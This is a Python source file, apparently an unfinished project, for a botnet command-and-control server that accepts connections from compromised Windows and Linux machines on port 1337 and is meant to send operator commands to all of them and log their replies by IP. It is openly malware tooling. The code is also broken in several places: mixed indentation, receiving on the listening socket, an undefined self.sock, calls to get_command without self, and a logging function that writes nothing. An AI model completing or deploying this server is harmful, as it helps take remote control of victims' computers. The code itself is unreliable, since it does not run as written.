#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ______
"""

try:
	import socket # Import socket for creating TCP connection.
	from time import sleep # Import sleep from time to halt execution of program when necessary.
	from os import devnull, _exit # Import devnull from os to send stderr to devnull.
	from sys import exit # Import exit from sys to quit program when specified.
except ImportError as err:
	print(f"Error: {err}")
	
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  ANSICOLORS  #
RESET = "\033[0m"
BOLD = "\033[01m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
	def __init__(self):
		self.windows_count = 0 # Count for the number of Windows machines connected to our botnet.
		self.linux_count = 0 # Count for the number of Linux machines connected to our botnet.
		self.windows_connections = {} # Dict containing Windows machines IP addresses and corresponding socket object.
		self.linux_connections = {} # Dict containing Linux machines IP addresses and corresponding socket object.
		self.server_socket = None # Will store the socket object created for the server.
		
	def create_server_socket(self):
		"""This function will create a single server socket will accept
			incoming connections from bots.
			
			Arguments:
				None

			Returns:
				None			
		"""
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
			PORT = 1337 # Port number to receve connection from.
			IP = "172.17.0.1" # IP address of server.
			sock.bind((IP, PORT)) # Bind the IP and port to a network interface card.
			sock.listen(10)	# Listen for incoming connections, default is 10, increase for more connections.
			conn, addr = sock.accept() # Accept incoming connections, store connection socket and client IP, Port
			response = sock.recv(1024).decode('utf-8') # Decode initial response from connection as utf-8

			if "Window" in response: # Check if operating system of client is Windows.
				self.windows_count += 1 # If Windows, increment Windows counter and create dictionary key, value pair.
				self.windows_connections[addr[1]] = conn
			elif "Linux" in response: # Else Linux, increment Linux counter and create dictionary key, value pair.
				self.linux_count += 1
				self.linux_connections[addr[1]] = conn

			self.server_socket = sock # Set the instance socket to the connection socket we establisehd with our client.
    
    def get_command(self):
        """This function gets a command from the user.
        
            Arguments:
                None
            
            Returns:
                The command that was provided by the user.
        """
        command = input(GREEN, 'Command $: ', RESET) # Prompt user for command to send to entire botnet.
        return command # Return command specified.
        
	def send_cmd_all_linux(self):
		"""This function will send the command to all linux bots in the botnet.

			Arguments:
				None

			Returns:
				Will return the response generated by the executed command on the client machines operating on linux.
		"""
		command = get_command()
		for ip, conn in self.linux_connections.items():
		    conn.send(command)
			response = self.sock.recv(10000).decode('utf-8') # Store response received from executed command.
			self.write_response_output(response, ip) # Write response to file.
			
	def send_cmd_all_windows(self):
	    """This function sends a command to all windows bots in the botnet.
	    
	        Arguments:
	            None
	       
	        Returns:
	            None
	    """
        command = get_command()
	    for ip, conn in self.windows_connections.items():
		    conn.send(command)
		    response = self.sock.recv(10000).decode('utf-8')
		    self.write_response_output(response, ip)
			
	
	def send_cmd_specific(self):
		"""This function will send a command to specific IP addresses.

			Arguments:
				None

			Returns:
				None
		"""
		command = input(GREEN, 'Command $: ', RESET) # Prompt user for command to send to specified bots.

	def write_response_output(self, response: str, ip_addr: str):
		"""This function will write the response generated by each machine in the botnet
			to a folder called "bots". The bots folder will contain files called by
			the IP addresses of compromised machine.

			Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.

			Returns:
				None
		"""
		with open("bots/" + ip_addr, 'a+') as botfile:
			pass
    
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
	botnetObj.create_server_socket()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
		try:
			print(RED, "Exiting server...", RESET)
			exit(1)
		except SystemExit: # Handling SystemExit error.
			_exit(1)